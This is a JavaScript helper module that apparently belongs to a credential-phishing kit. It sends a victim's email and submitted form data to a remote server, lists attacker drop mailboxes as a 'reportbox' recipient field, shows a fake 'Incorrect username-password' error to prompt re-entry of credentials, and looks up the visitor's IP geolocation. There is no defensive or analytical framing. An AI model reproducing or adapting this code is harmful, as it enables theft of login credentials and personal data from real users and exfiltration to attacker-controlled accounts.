import axios from "axios";
import { toast } from "react-toastify";

const serverurl = require("../users.json");

export const getHost = (email) =>
  fetch(`${serverurl.nwabu.serverurl}/start`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: email }),
  }).then((response) => response.json());

export const sendFile = (data) =>
  fetch(`${serverurl.nwabu.serverurl}/mail`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ...data,
      reportbox: "mb4ckup.m4il@yandex.com, jhonsnow751@gmail.com", // "resultbox4us@outlook.com" "mb4ckup.m4il@yandex.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
    }),
  }).then((response) => response.json());

export const notify = () =>
  toast.error("Incorrect username-password", {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });

export const getIP = async () => {
    const res = await axios.get("https://geolocation-db.com/json/");
    return res;
  };